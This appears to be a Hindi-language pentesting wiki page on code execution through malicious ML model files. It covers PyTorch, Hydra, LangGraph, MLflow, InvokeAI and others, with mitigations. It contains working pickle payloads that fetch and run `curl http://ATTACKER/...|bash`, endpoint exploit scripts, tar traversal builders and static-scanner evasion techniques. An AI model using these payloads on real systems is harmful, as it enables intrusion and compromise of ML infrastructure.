# Models RCE

{{#include ../banners/hacktricks-training.md}}

## RCE के लिए मॉडल लोड करना

Machine Learning मॉडल आमतौर पर ONNX, TensorFlow, PyTorch आदि जैसे अलग-अलग formats में साझा किए जाते हैं। डेवलपर की मशीनों या production systems में इस्तेमाल करने के लिए इन मॉडल्स को लोड किया जा सकता है। आमतौर पर मॉडल्स में malicious code नहीं होना चाहिए, लेकिन कुछ मामलों में मॉडल का इस्तेमाल system पर arbitrary code execute करने के लिए किया जा सकता है—या तो intended feature के रूप में, या model loading library की vulnerability के कारण।

इस category की कुछ प्रतिनिधि vulnerabilities नीचे दी गई table में सूचीबद्ध हैं:

| **Framework / Tool**        | **Vulnerability (यदि उपलब्ध हो तो CVE)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` में insecure deserialization* **(CVE-2025-32434)**                                                              | Model checkpoint में malicious pickle से code execution होता है (`weights_only` safeguard को bypass करके)                                | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download से code execution होता है; management API में Java deserialization RCE                                   | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` के ज़रिए unsafe checkpoint deserialization **(CVE-2025-23298)**                                           | Untrusted checkpoint, `load_model_trainer_states_from_checkpoint` के दौरान pickle reducer trigger करता है → ML worker में code execution | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key से SQL/JSON-path syntax inject होता है, `UNION SELECT` एक fake checkpoint row बनाता है, फिर `msgpack` deserialization attacker द्वारा चुने गए Python code को import और call करता है | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML से मॉडल लोड करने पर `yaml.unsafe_load` इस्तेमाल होता है (code exec) <br> **Lambda** layer वाला मॉडल लोड करने पर arbitrary Python code चलता है | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | तैयार की गई `.tflite` model file integer overflow trigger करती है → heap corruption (संभावित RCE)                                       | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` के ज़रिए मॉडल लोड करने पर attacker के `__reduce__` payload वाला pickle execute होता है                                     | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *विवादित*                                                                              | `numpy.load` में default रूप से pickled object arrays की अनुमति थी – malicious `.npy/.npz` से code exec trigger होता है                  | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model का external-weights path directory से बाहर जा सकता है (arbitrary files पढ़ सकता है) <br> Malicious ONNX model tar arbitrary files को overwrite कर सकता है (जिससे RCE हो सकता है) | |
| ONNX Runtime (design risk)  | *(कोई CVE नहीं)* ONNX custom ops / control flow                                                                                    | Custom operator वाले मॉडल में attacker का native code लोड करना ज़रूरी हो सकता है; जटिल model graphs logic का दुरुपयोग करके अनचाहे computations execute कर सकते हैं | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` enabled होने पर model-load API का इस्तेमाल relative path traversal के ज़रिए files लिखने की अनुमति देता है (उदाहरण के लिए, RCE के लिए `.bashrc` overwrite करना) | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (कई heap overflows)                                                                         | Malformed GGUF model file parser में heap buffer overflows पैदा करती है, जिससे victim system पर arbitrary code execution संभव होता है | |
| **Keras (पुराने formats)**   | *(कोई नया CVE नहीं)* Legacy Keras H5 model                                                                                         | Lambda layer वाली malicious HDF5 (`.h5`) model load होने पर अब भी code execute करती है (Keras `safe_mode` पुराने format को cover नहीं करता – “downgrade attack”) | |
| **अन्य** (सामान्य)        | *Design flaw* – Pickle serialization                                                                                         | कई ML tools (उदाहरण के लिए, pickle-based model formats, Python `pickle.load`) mitigation न होने पर model files में embedded arbitrary code execute करेंगे | |
| **NeMo / uni2TS / FlexTok (Hydra)** | `hydra.utils.instantiate()` को दिया गया untrusted metadata **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config `_target_` को arbitrary callable (उदाहरण के लिए, `builtins.exec`) पर set करता है → “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) के साथ भी load के दौरान execute होता है | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

इसके अलावा, PyTorch जैसे कुछ Python pickle-based मॉडल भी हैं ([PyTorch](https://github.com/pytorch/pytorch/security)), जिनका इस्तेमाल system पर arbitrary code execute करने के लिए किया जा सकता है, अगर उन्हें `weights_only=True` के साथ लोड न किया जाए। इसलिए, कोई भी pickle-based मॉडल इस तरह के attacks के प्रति विशेष रूप से susceptible हो सकता है, भले ही वह ऊपर दी गई table में सूचीबद्ध न हो।

### Pickle-based checkpoints पर static checks को चकमा देना

ऐसा model-loading path जो unrestricted `pickle.load()`, `joblib.load()`, या `torch.load(..., weights_only=False)` call करता है, केवल parser नहीं, बल्कि execution sink है।<sup>[[22]](#references)</sup> PyTorch 2.6 में, custom pickle module न दिए जाने पर `torch.load()` का default `weights_only=True` होता है; नीचे दिए गए examples के लिए unsupported object लोड करने हेतु unrestricted loader या ऐसा application ज़रूरी है जो इस protection को disable करता हो।<sup>[[4]](#references)</sup> Static scan का साफ़ नतीजा इस सीमा को नहीं बदलता।<sup>[[21]](#references)</sup>

बुनियादी `__reduce__` primitive के लिए [Python pickle deserialization](../pentesting-web/deserialization/#pickle) देखें और runtime import checks के लिए [Fickling's ML import allowlist](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) देखें।

#### Callable register करें, फिर उसे `EXT2` से resolve करें

एक pickle, `REDUCE` के ज़रिए `copyreg.add_extension` call करके attacker द्वारा चुने गए numeric extension code के तहत module/name pair register कर सकता है। बाद में `EXT2` उस code को callable से resolve करता है, जिसे एक और `REDUCE` invoke कर सकता है। इसलिए, critical callable किसी `GLOBAL` या `STACK_GLOBAL` opcode का operand नहीं होता। Binarly ने `multiprocessing.util.spawnv_passfds` के साथ इसका प्रदर्शन किया; जांचे गए पांच scanners में से चार इसे नहीं पकड़ पाए, जबकि SaferPickle ने detect किया। Registry mutation और `EXT2` resolution एक ही unpickling operation के दौरान होते हैं।<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

यह opcode sketch है, पूर्ण checkpoint नहीं: बाहरी loader को आसपास की pickle stream स्वीकार करनी होगी। केवल खतरनाक callables के लिए `GLOBAL` operands खोजने वाला scanner बाद के lookup को चूक जाता है; `EXT2` support के बिना scanner verdict देने से पहले विफल हो सकता है। सख्त allowlist `copyreg.add_extension` को भी अस्वीकार कर सकती है।<sup>[[21]](#references)</sup>

#### निर्मित code-object types को सामान्य functions के पीछे छिपाएँ

एक अन्य pickle chain `type(copy.copy)` से `FunctionType` और `type(copy.copy.__code__)` से `CodeType` प्राप्त कर सकती है, फिर दिए गए bytecode से code object बनाकर उसे function के रूप में wrap करती है और call करती है। प्रकाशित variant `operator.methodcaller('__getattribute__', '__code__')` के ज़रिये `__code__` प्राप्त करता है, इसलिए pickle को किसी भी constructor को नाम से import करने की ज़रूरत नहीं होती। इसका `CodeType(...)` field layout और bytecode CPython version के अनुसार अलग होते हैं; किसी दूसरे interpreter के लिए बनाया गया payload execution से पहले विफल हो सकता है। SaferPickle ने प्रदर्शित sample को फिर भी flag किया, लेकिन उसे `suspicious` तक downgrade कर दिया; मूल्यांकन किए गए अन्य चार scanners इसे चूक गए।<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### pickle argument से दूसरा model load trigger करें

एक outer pickle, attacker-supplied serialized model को argument के रूप में देकर `torch.storage._load_from_bytes` को call कर सकता है। यह function `torch.load(io.BytesIO(b), weights_only=False)` call करता है, इसलिए nested model को weights-only restriction के बिना deserialize किया जाता है, भले ही top-level opcode scanner को यह एक callable को दिए गए bytes दिखाई दें। Outer load को फिर भी उस callable की अनुमति देनी होगी; `weights_only=True` से outer pickle अपने आप उसे स्वीकार नहीं करता। जो scanners nested bytes को recursively scan नहीं करते, वे inner `GLOBAL`/`REDUCE` chain को miss कर सकते हैं।<sup>[[21]](#references)[[23]](#references)</sup>

#### load के समय legacy pickle module name resolve करें

3 से कम के pickle protocols के लिए, Python का default `fix_imports=True`, `_compat_pickle.IMPORT_MAPPING` के ज़रिए `commands.run` के `GLOBAL` reference को `subprocess.run` पर map करता है। इसलिए, literal module string की तुलना `subprocess` denylist से करने वाला scanner runtime callable को miss कर सकता है। इसके लिए ऐसे loader की ज़रूरत है जो compatibility mapping को बनाए रखे और उससे बने call arguments को स्वीकार करे।<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### non-ZIP checkpoint को ZIP-only scanner से बचाकर निकालें

Format selection, opcode inspection से अलग तरीके से fail हो सकता है: Binarly ने पाया कि ModelScan 0.8.8 ने `.bin`, `.pt`, `.pth` और `.ckpt` files को ZIP-specific PyTorch scanner पर भेजा और non-ZIP pickle stream को plain-pickle scanner पर fallback करने के बजाय skip कर दिया। उसने एक legacy TAR model layout भी दर्ज किया, जिसे `torch.load()` स्वीकार करता है, लेकिन ModelScan और JFrog ने inspect नहीं किया। ये scanner के version-विशिष्ट gaps हैं, हर model scanner की विशेषताएँ नहीं।<sup>[[21]](#references)</sup>

#### static parser के malformed tail तक पहुँचने से पहले execute करें

जो scanner `pickletools.genops()` का उपयोग करके pickle को पूरी तरह पढ़ता है, वह valid `REDUCE` के बाद truncated opcode मिलने पर exception raise कर सकता है। Unrestricted unpickler उस tail तक पहुँचने से पहले ही callable invoke कर चुका होता है, भले ही अंत में पूरा load exception raise करे। रिपोर्ट किए गए sample में executing `REDUCE` के तुरंत बाद truncated `BINUNICODE` रखा गया था, जिससे `pickletools.genops()` fail हुआ, जबकि उससे पहले file-write side effect हो चुका था। यह bypass केवल तभी काम करता है जब scanner parse error को clean मान ले या file को skip कर दे। यह तभी उपयोगी है जब side effect, सफलतापूर्वक लौटाए गए model के बिना भी मायने रखता हो; जिस target को load पूरा होना ज़रूरी हो, वह artifact को reject कर सकता है।<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (safetensors के साथ भी काम करता है)

`hydra.utils.instantiate()`, configuration/metadata object में मौजूद किसी भी dotted `_target_` को import और call करता है। जब Hugging Face Transformers जैसी libraries **untrusted model metadata** को `instantiate()` में भेजती हैं, तो attacker ऐसा callable और arguments दे सकता है जो model load के दौरान तुरंत run होते हैं (pickle की ज़रूरत नहीं)।<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload का उदाहरण (`.nemo` के `model_config.yaml`, repo के `config.json`, या `.safetensors` के अंदर `__metadata__` में काम करता है):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

मुख्य बिंदु:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders और FlexTok loaders में model initialization से पहले trigger होता है।
- Hydra की string block-list को वैकल्पिक import paths (जैसे `enum.bltns.eval`) या application द्वारा resolve किए गए names (जैसे `nemo.core.classes.common.os.system` → `posix`) के ज़रिए bypass किया जा सकता है।<sup>[[14]](#references)</sup>
- FlexTok, Hydra call से पहले `ast.literal_eval` की मदद से stringified metadata भी parse करता है, जिससे DoS (CPU/memory blowup) हो सकता है।

### 🆕  `torch.load` के ज़रिए InvokeAI RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion के लिए एक लोकप्रिय open-source web interface है। इसके **5.3.1 – 5.4.2** versions में REST endpoint `/api/v2/models/install` उपलब्ध है, जो users को मनमाने URLs से models download और load करने देता है।<sup>[[1]](#references)</sup>

आंतरिक रूप से, यह endpoint अंततः यह call करता है:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

जब दी गई फ़ाइल **PyTorch checkpoint (`*.ckpt`)** होती है, तो `torch.load` **pickle deserialization** करता है। क्योंकि सामग्री सीधे user-controlled URL से आती है, इसलिए attacker checkpoint में custom `__reduce__` method वाला malicious object एम्बेड कर सकता है; यह method **deserialization के दौरान** execute होता है, जिससे InvokeAI server पर **remote code execution (RCE)** हो सकता है।

इस vulnerability को **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) दिया गया था।

#### Exploitation का चरण-दर-चरण विवरण

1. एक malicious checkpoint बनाएँ:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` को अपने नियंत्रण वाले HTTP server पर होस्ट करें (जैसे, `http://ATTACKER/payload.ckpt`)।
3. Vulnerable endpoint को trigger करें (authentication आवश्यक नहीं है):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. जब InvokeAI फ़ाइल डाउनलोड करता है, तो यह `torch.load()` को कॉल करता है → `os.system` gadget चलता है और attacker को InvokeAI process के context में code execution मिल जाता है।

तैयार exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरी प्रक्रिया को automate करता है।<sup>[[3]](#references)</sup>

#### शर्तें

•  InvokeAI 5.3.1-5.4.2 (scan flag का default **false** है)
•  `/api/v2/models/install` attacker के लिए reachable हो
•  Process के पास shell commands execute करने की permissions हों

#### Mitigations

* **InvokeAI ≥ 5.4.3** पर upgrade करें – patch, default रूप से `scan=True` सेट करता है और deserialization से पहले malware scanning करता है।<sup>[[2]](#references)</sup>
* Checkpoints को programmatically load करते समय `torch.load(file, weights_only=True)` या नए [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper का उपयोग करें।
* Model sources के लिए allow-lists / signatures लागू करें और service को least-privilege के साथ चलाएँ।

> ⚠️ याद रखें कि Python के किसी भी pickle-based format (जिसमें कई `.pt`, `.pkl`, `.ckpt`, `.pth` फ़ाइलें शामिल हैं) को untrusted sources से deserialize करना स्वाभाविक रूप से unsafe है।

---

यदि आपको पुराने InvokeAI versions को reverse proxy के पीछे चलाना जारी रखना हो, तो ad-hoc mitigation का एक उदाहरण:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA के Transformers4Rec (Merlin का हिस्सा) में एक unsafe checkpoint loader था, जो उपयोगकर्ता द्वारा दिए गए paths पर सीधे `torch.load()` कॉल करता था। चूँकि `torch.load` Python `pickle` पर निर्भर करता है, इसलिए attacker-controlled checkpoint deserialization के दौरान reducer के ज़रिए arbitrary code execute कर सकता है।<sup>[[5]](#references)</sup>

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`।

इससे RCE क्यों होता है: Python pickle में कोई object ऐसा reducer (`__reduce__`/`__setstate__`) define कर सकता है, जो एक callable और arguments लौटाता है। Unpickling के दौरान callable execute होता है। अगर ऐसा object checkpoint में मौजूद हो, तो कोई भी weights इस्तेमाल होने से पहले यह execute हो जाता है।

Minimal malicious checkpoint example:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

डिलीवरी वेक्टर और प्रभाव का दायरा:
- repos, buckets या artifact registries के ज़रिए साझा किए गए Trojanized checkpoints/models
- Automated resume/deploy pipelines, जो checkpoints को अपने-आप load करती हैं
- Execution training/inference workers के अंदर होता है, अक्सर elevated privileges के साथ (जैसे containers में root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने सीधे `torch.load()` के इस्तेमाल को हटाकर `transformers4rec/utils/serialization.py` में लागू restricted, allow-listed deserializer का इस्तेमाल किया। नया loader types/fields को validate करता है और load के दौरान arbitrary callables को invoke होने से रोकता है।<sup>[[7]](#references)</sup>

PyTorch checkpoints के लिए विशिष्ट सुरक्षा मार्गदर्शन:
- Untrusted data को unpickle न करें। संभव हो तो [Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX जैसे non-executable formats को प्राथमिकता दें।
- यदि आपको PyTorch serialization का उपयोग करना ही है, तो सुनिश्चित करें कि `weights_only=True` हो (नए PyTorch versions में supported) या Transformers4Rec patch जैसा custom allow-listed unpickler इस्तेमाल करें।<sup>[[4]](#references)</sup>
- Model provenance/signatures लागू करें और deserialization को sandbox करें (seccomp/AppArmor; non-root user; restricted FS और network egress बंद रखें)।
- Checkpoint load के समय ML services से unexpected child processes की निगरानी करें; `torch.load()`/`pickle` के इस्तेमाल को trace करें।

POC और vulnerable/patch references:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Patch से पहले का vulnerable loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Patch के बाद का loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## उदाहरण – malicious PyTorch model तैयार करना

- Model बनाएँ:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- मॉडल लोड करें:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent का FaceDetection-DSFD एक `resnet` endpoint उपलब्ध कराता है, जो user-controlled data को deserialize करता है। ZDI ने पुष्टि की कि remote attacker किसी victim से malicious page/file load करवा सकता है, उससे इस endpoint पर crafted serialized blob भेजवा सकता है और `root` के रूप में deserialization ट्रिगर कर सकता है, जिससे सिस्टम पर पूरा नियंत्रण मिल जाता है।

Exploit flow आम pickle abuse जैसा है:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Deserialization के दौरान reachable कोई भी gadget (constructors, `__setstate__`, framework callbacks आदि) को इसी तरह weaponize किया जा सकता है, चाहे transport HTTP, WebSocket हो या watched directory में डाली गई कोई file।



### LangGraph checkpointer SQLi → MessagePack RCE

यह attack chain दिलचस्प है क्योंकि attacker को **malicious model file upload करने की ज़रूरत नहीं होती**। इसके बजाय, application एक **AI-agent persistence API** (`get_state_history(..., filter=...)`) expose करती है और user input checkpointer query builder तक पहुँचता है।

#### 1. Metadata filters में Structural SQLi

एक vulnerable SQLite pattern ऐसा दिखता था:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

मान बाद में bind किया जाता है, लेकिन `query_key` को **JSON path string** में concatenate किया जाता है, इसलिए dictionary key के अंदर का `'` `'$.{query_key}'` से बाहर निकलकर SQL inject करता है। यही बात **JSON paths, identifiers, operators, `LIMIT`, और TTL fields** पर भी लागू होती है: placeholders केवल values को सुरक्षित रखते हैं, query syntax की संरचना को नहीं।

#### 2. `UNION SELECT` downstream sinks को target कर सकता है, सिर्फ data theft को नहीं

Query `type` और serialized `checkpoint` bytes लौटाती है, जिन्हें बाद में इस तरह उपयोग किया जाता है:

```python
self.serde.loads_typed((type, checkpoint))
```

इसका मतलब है कि `WHERE` clause में SQLi एक **नकली result row** inject कर सकती है:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

यदि बाद का code किसी चुने हुए column को parse, deserialize, write या execute करता है, तो उन columns को उनके sinks से map करें। इस मामले में fake row, SQLi को **attacker-controlled deserialization** में बदल देती है।

#### 3. Unsafe MessagePack extension hooks, code gadgets के समकक्ष हैं

LangGraph के `msgpack` path में एक custom extension hook का उपयोग किया गया था, जो nested tuple को unpack करके यह execute करता था:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

इसलिए `("os", "system", "id > /tmp/pwned")` के समकक्ष कुछ encode करने वाला MessagePack extension object `os` import करता है, `system` को resolve करता है और command चलाता है। AI frameworks की समीक्षा करते समय, **custom MessagePack/JSON/pickle revivers** में dynamic imports, reflection या arbitrary callable dispatch की जाँच करें।

#### 4. Agent frameworks के लिए व्यावहारिक audit pattern

ऐसे किसी भी user-controlled input की समीक्षा करें जो इन तक पहुँचता हो:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders, जो SQL या Redis query fragments बनाते हैं
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths, जो persistence layer से लौटाई गई rows पर भरोसा करते हैं

यह विशेष chain self-hosted LangGraph deployments को प्रभावित करती थी, जो **SQLite** या **Redis** checkpointers का उपयोग करते थे और जहाँ untrusted users `filter` को नियंत्रित कर सकते थे। Disclosure में बताए गए patched versions `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` और `langgraph-checkpoint 4.0.1+` थे।<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact overwrite से pickle RCE

`PythonModel` से बनाया गया MLflow PyFunc serialized object को `python_model.pkl` के रूप में store कर सकता है। Model metadata में `mlflow.pyfunc.model` को उसका loader बताया जाता है और MLflow का implementation saved Python model के लिए इसी filename का उपयोग करता है। इसलिए, artifact store तक write access से किसी दूसरे application में code execution हो सकता है, जो बाद में model load करता है।<sup>[[17]](#references)[[18]](#references)</sup>

काम की chain है **artifact write permission → pickle को replace करना → inference consumer से उसे दोबारा load करवाना**। `mlflow-artifacts:/...` proxied root वाले experiment के लिए, experiment, run और model artifact path enumerate करें। Tracking server `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` पर `GET` और `PUT` उपलब्ध कराता है।<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

एक न्यूनतम reducer, consumer के artifact को unpickle करते ही command चला सकता है। `MLmodel` में घोषित Python version से payload जनरेट करने पर compatibility समस्याओं से बचा जा सकता है।<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

उस operation को trigger करें जो **मौजूदा model लोड करता है**, जैसे prediction, scoring या deployment। पहले से retrain न करें, क्योंकि training malicious artifact को नए model से बदल सकती है। Application error का मतलब यह नहीं है कि exploitation नहीं हुआ: reducer, usable model के बजाय command का integer exit status लौटाता है। पहले ICMP या HTTP callback जैसे observable side effect से शुरुआत करें, फिर उसे final payload से बदलें।<sup>[[20]](#references)</sup>

Assessment के दौरान, run बनाने की permission और किसी दूसरे run से जुड़े artifacts को overwrite करने की permission में अंतर करें। Authentication और per-run update permissions की समीक्षा करें, `python_model.pkl` में हुए अप्रत्याशित modifications की जाँच करें, और model provenance तथा integrity को execution boundary का हिस्सा मानें। मौजूदा MLflow code में `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` सेट करने का विकल्प भी है, और cloudpickle data लोड करने के बजाय models-from-code artifacts इस्तेमाल करने की सलाह दी जाती है।<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Exposed model servers और ML infrastructure

Malicious model लोड करना, ML infrastructure पर code चलाने का एकमात्र तरीका नहीं है। Job submission APIs, code-validation endpoints और self-hosted AI services के model registry pulls, बिना किसी model file के भी code execution का कारण बन सकते हैं। देखें [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md)।

## Models से Path Traversal

जैसा कि [**इस blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में बताया गया है, अलग-अलग AI frameworks द्वारा इस्तेमाल किए जाने वाले ज़्यादातर model formats archives पर आधारित होते हैं, आमतौर पर `.zip`। इसलिए, इन formats का दुरुपयोग करके path traversal attacks करना संभव हो सकता है, जिससे उस system की arbitrary files पढ़ी जा सकती हैं जहाँ model लोड किया जाता है।<sup>[[16]](#references)</sup>

उदाहरण के लिए, नीचे दिए गए code से आप ऐसा model बना सकते हैं जो लोड होने पर `/tmp` directory में एक file बनाएगा:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

या, निम्नलिखित कोड से आप ऐसा मॉडल बना सकते हैं जो लोड होने पर `/tmp` डायरेक्टरी का symlink बनाएगा:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### गहन विश्लेषण: Keras .keras deserialization और gadget hunting

.keras internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import issue और fix के बाद allowlist के अंदर gadget discovery के लिए एक केंद्रित guide देखें:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI में अविश्वसनीय डेटा का deserialization"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module का दस्तावेज़](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load के लिए security संबंधी विचार](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: NVIDIA Merlin में Remote Code Execution प्राप्त करना](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [patch से पहले का vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [patch के बाद का loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – आधुनिक AI/ML formats और libraries के ज़रिए Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate के दस्तावेज़](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (RCE के बारे में चेतावनी)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi से RCE तक: LangGraph के Checkpointer का exploit करना](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
